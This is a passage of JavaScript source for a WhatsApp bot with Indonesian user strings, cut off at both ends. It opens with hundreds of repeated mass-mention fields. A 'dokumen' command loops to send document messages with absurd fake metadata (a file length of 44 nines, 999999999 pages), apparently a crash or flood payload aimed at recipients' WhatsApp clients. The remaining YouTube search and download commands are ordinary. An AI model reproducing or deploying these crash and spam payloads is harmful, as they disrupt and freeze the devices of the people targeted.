members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,"mentionedJid": members_ids,
			"forwardingScore": 1,
			"isForwarded": true

		}
	}
}, {quoted: mek}) 
kurr.relayWAMessage(res)
await console.log(`sukses`)
break
case 'dokumen':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
for (let i = 0; i < (q) ; i++){
        		res = await kurr.prepareMessageFromContent(from, {
        			"buttonsMessage": {
        				"documentMessage": {
						"url": "https://mmg.whatsapp.net/d/f/Arlf8SjxC1pNfv-HkHJkzPqs2aoiUfeHgA7D_Rk6jPHd.enc",
						"mimetype": "application/x-iso9660-image",
						"title": `👹⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗👹.iso`,
						"fileSha256": "TUl+j9Vr1GV1zl1CsCGniLqt3IfpGNrz8TKb6NUZUGk=",
						"fileLength": "99999999999999999999999999999999999999999999",
						"pageCount": 999999999,
						"mediaKey": "xQGLyZdyfOSPTIuzlr/azJKUezbYPIrtMmspC5sCMj4=",
						"fileName": `👹⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗👹${vapi()}`,
						"fileEncSha256": "iicTcwbd6M7y2HBaaWdOP8qX8y1jKeVfxzIIpyseFiU=",
						"directPath": "/v/t62.7119-24/23835493_4561953450525512_1824543540205926790_n.enc?ccb=11-4&oh=79861888de5274ad23c21e40e93267b7&oe=61AC1F1D",
						"mediaKeyTimestamp": "1636144269"
        				},
        				"contentText": "ShinChan",
        				"footerText": "〽️⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗〽️",
        				"buttons": [
        				{
        					"buttonId": "apa",
        					"buttonText": {
        						"displayText": `${ngazap()}`,
        					},
        					"type": 1
        				}
        				],
        				"headerType": "DOCUMENT"
        			}
        		}, {quoted:mek})
        		kurr.relayWAMessage(res)}
        		break
                case 'ytmp4':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
						if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp4 [linkYt]*`)
						let isLinks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
						if (!isLinks2) return reply(mess.error.Iv)
						try {
							sticWait(from)
							ytv(args[0])
							.then((res) => {
								const { dl_link, thumb, title, filesizeF, filesize } = res
								axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
								.then((a) => {
								if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, `❏ *YTmp4*\n\n❏ *Title* : ${title}\n❏ *Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Maaf durasi melebihi batas maksimal, Silahkan klik link diatas_`)
								sendFileFromUrl(dl_link, document, {mimetype: 'video/mp4', filename: `${title}.mp4`, quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:title,body:"🏴‍☠️ YTMP4",mediaType:"2",thumbnail:getBuffer(thumb),sourceUrl:`${body.slice(7)}`}}}).catch(() => reply(mess.error.api))
							})
							})
						} catch (err) {
							reply(mess.error.api)
						}
						break
case 'video':
            if (args.length === 0) return reply(`Kirim perintah *${prefix}video* _Judul video yang akan dicari_`)
            var srch = args.join('')
            aramas = await yts(srch);
            aramat = aramas.all 
            var mulaikah = aramat[0].url                            
                  try {
                    ytv(mulaikah)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then(async (a) => {
                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
                        const captions = `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                        sendMediaURL(from, thumb, captions)
                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
                        })                
                        })
                        } catch (err) {
                        reply(mess.error.api)
                        }
                   break 
						case 'ytsearch':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
            if (!args.length) return reply('Judulnya apa kak?')
            try {
            	sticWait(from)
                const input = args.join(" ")
                const filter1 = await ytsd.getFilters(input)
                const filters1 = filter1.get('Type').get('Video')
                const { items } = await ytsd(filters1.url, { limit: 10 })
                let hehe = `*🏴‍☠️ YOUTUBE SEARCH*
*🏴‍☠️ Search Query:* ${input}\n\n`
                for (let i = 0; i < items.length; i++) {
                    hehe += `───────────────\n
*🏴‍☠️ Judul:* ${items[i].title}
*🏴‍☠️ Id:* ${items[i].id}
*🏴‍☠️ Ditonton:* ${items[i].views}
*🏴‍☠️ Durasi:* ${items[i].duration}
*🏴‍☠️ Link:* ${items[i].url}\n\n`
                }
                thumb = await getBuffer(items[0].bestThumbnail.url)
                await kurr.sendMessage(from, thumb, image, {quoted: ftrol, caption: `${hehe}───────────────\n
*🏴‍☠️ DOWNLOAD*
🏴‍☠️ ${prefix}ytmp3 [link yt] = Audio
🏴‍☠️ ${prefix}ytmp4 [link yt] = Video`, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:`SEARCH: ${args[0]}`,body:"🏴‍☠️YOUTUBE SEARCH",mediaType:"2",thumbnail:pporigi,mediaUrl:`https://youtu.be/JN_Gw2GzuqQ`}}})
            } catch(e) {
                reply('Didn\'t find anything or there is any error!')
                reply(`Error: ${e.message}`)
            }
            break
					case 'ytmp3':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
						if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp3 [linkYt]*`)
						let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
						if (!isLinks) return reply(mess.error.Iv)
						try {
							sticWait(from)
							yta(args[0])
							.then((res) => {
								const { dl_link, thumb, title, filesizeF, filesize } = res
								axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
								.then((a) => {
